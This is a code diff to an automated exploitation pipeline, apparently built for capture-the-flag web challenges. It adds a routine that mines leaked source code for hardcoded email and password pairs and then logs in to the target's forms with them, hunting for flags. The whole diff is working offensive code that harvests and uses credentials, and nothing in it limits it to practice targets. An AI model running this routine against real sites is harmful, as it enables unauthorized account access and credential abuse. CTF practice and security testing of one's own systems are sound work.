@@ -700,6 +700,9 @@ class AutoPwnPipeline:
         # ── 7. Sensitive-file leak prediction ────────────────────────────
         if sensitive_hits:
             predictions.append(("source_leak", 0.9, f"{len(sensitive_hits)} sensitive files leaked - source analysis surface"))
+            # If source is leaked AND there's a login form, hardcoded creds are likely
+            if any(any("pass" in i.get("name", "").lower() for i in f.get("inputs", [])) for f in forms):
+                predictions.append(("source_credentials", 0.85, "Leaked source + login form - hardcoded credentials likely"))
 
         # ── 8. Leaked-source driven predictions ──────────────────────────
         if re.search(r"shell_exec\s*\(|system\s*\(|exec\s*\(|passthru\s*\(", all_source):
@@ -763,6 +766,7 @@ class AutoPwnPipeline:
             "cbc_bitflip": self._exploit_cbc_bitflip,
             "cookie_manipulation": self._exploit_cookie_brute_force,
             "md5_id_bruteforce": self._exploit_md5_id_bruteforce,
+            "source_credentials": self._exploit_source_credentials,
             "cors": self._exploit_cors,
             "open_redirect": self._exploit_open_redirect,
             "hpp": self._exploit_hpp,
@@ -909,6 +913,14 @@ class AutoPwnPipeline:
                 self._exploit_md5_id_bruteforce()
             except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                 print_warning(f"MD5 ID brute-force failed: {e}")
+
+        # Source credential extraction (Crystal Peak-style) should also always run,
+        # since leaked source often contains hardcoded email/password for login.
+        if len(self.state.get("captured_flags", [])) == total_flags_before:
+            try:
+                self._exploit_source_credentials()
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                print_warning(f"Source credential extraction failed: {e}")
 
         self._exploit_client_side_crypto()
         self._exploit_reasoning_driven()
@@ -1366,6 +1378,100 @@ class AutoPwnPipeline:
                         print_success(f"  [MD5 ID BF] Flag pattern found for ID {uid} (hash {md5_hash}) on {url}!")
                         self._check_and_store_flags(r.text, f"MD5 ID BF success (ID {uid})")
                         return True
+                except Exception:
+                    pass
+        return success
+
+    def _exploit_source_credentials(self):
+        """
+        Analyze leaked source code for hardcoded credentials (email/password)
+        or login validation logic, then use them to authenticate.
+        Fixes challenges like Crystal Peak where creds are in the source.
+        """
+        print_info("Analyzing leaked source for hardcoded credentials...")
+        success = False
+        leaked = self.state.get("leaked_source_files", {})
+        if not leaked:
+            return False
+
+        # Collect all source content
+        all_source = " ".join(leaked.values())
+
+        # 1. Look for hardcoded email/password pairs
+        creds = []
+        # Pattern: email = "..." / password = "..." or email: "..." / password: "..."
+        email_pass_pairs = re.findall(
+            r'(?:email|user|username|login)\s*[:=]\s*["\']([^"\']+)["\']\s*[,;]?\s*(?:password|pass|pwd)\s*[:=]\s*["\']([^"\']+)["\']',
+            all_source, re.IGNORECASE)
+        for e, p in email_pass_pairs:
+            creds.append((e, p))
+        # Pattern: password = "..." / email = "..."
+        pass_email_pairs = re.findall(
+            r'(?:password|pass|pwd)\s*[:=]\s*["\']([^"\']+)["\']\s*[,;]?\s*(?:email|user|username|login)\s*[:=]\s*["\']([^"\']+)["\']',
+            all_source, re.IGNORECASE)
+        for p, e in pass_email_pairs:
+            creds.append((e, p))
+
+        # 2. Look for validation logic (if email == "..." && password == "...")
+        if not creds:
+            validation = re.findall(
+                r'(?:email|user|username)\s*[=!]=\s*["\']([^"\']+)["\'].{0,50}(?:password|pass|pwd)\s*[=!]=\s*["\']([^"\']+)["\']',
+                all_source, re.IGNORECASE)
+            for e, p in validation:
+                creds.append((e, p))
+
+        # 3. Look for JavaScript object / dict style: 'email': 'password' or "email": "password"
+        #    e.g. const users = { 'admin@x.com': 'pass123' } or { email: 'x', password: 'y' }
+        if not creds:
+            # Pattern: 'email@domain': 'password' (JS object key-value)
+            js_obj_pairs = re.findall(
+                r'["\']([^"\']+@[^"\']+)["\']\s*:\s*["\']([^"\']+)["\']',
+                all_source, re.IGNORECASE)
+            for e, p in js_obj_pairs:
+                creds.append((e, p))
+            # Pattern: email: 'x', password: 'y' (JS object with named keys)
+            js_named_pairs = re.findall(
+                r'(?:email|user|username)\s*:\s*["\']([^"\']+)["\']\s*[,;]\s*(?:password|pass|pwd)\s*:\s*["\']([^"\']+)["\']',
+                all_source, re.IGNORECASE)
+            for e, p in js_named_pairs:
+                creds.append((e, p))
+            # Pattern: password: 'y', email: 'x'
+            js_named_pairs2 = re.findall(
+                r'(?:password|pass|pwd)\s*:\s*["\']([^"\']+)["\']\s*[,;]\s*(?:email|user|username)\s*:\s*["\']([^"\']+)["\']',
+                all_source, re.IGNORECASE)
+            for p, e in js_named_pairs2:
+                creds.append((e, p))
+
+        if not creds:
+            print_info("  No hardcoded credentials found in leaked source.")
+            return False
+
+        # 3. Try each credential on the login form
+        for email, password in creds:
+            print_info(f"  Found credential: {email} / {password}")
+            for form in self.state.get("forms", []):
+                action = form.get("action", self.target_url)
+                method = form.get("method", "POST").upper()
+                inputs = [i.get("name", "") for i in form.get("inputs", [])]
+                email_field = next((n for n in inputs if any(k in n.lower() for k in ["email", "user", "username", "login"])), None)
+                pass_field = next((n for n in inputs if any(k in n.lower() for k in ["pass", "pwd"])), None)
+                if not email_field or not pass_field:
+                    continue
+                try:
+                    data = {email_field: email, pass_field: password}
+                    if method == "POST":
+                        r = self.session.post(action, data=data, timeout=8, allow_redirects=True)
+                    else:
+                        r = self.session.get(action, params=data, timeout=8, allow_redirects=True)
+                    if self._check_and_store_flags(r.text, f"Source creds ({email})"):
+                        print_success(f"  Flag captured using source credentials {email}!")
+                        return True
+                    # Check for auth success indicators
+                    if any(k in r.text.lower() for k in ["welcome", "dashboard", "logged in", "flag", "success", "profile", "account"]):
+                        print_success(f"  [Source Creds] Login succeeded with {email}!")
+                        self._log_step("Phase 4: Source Creds", f"Login with {email}", details=action)
+                        self._check_and_store_flags(r.text, f"Source creds login ({email})")
+                        success = True
                 except Exception:
                     pass
         return success
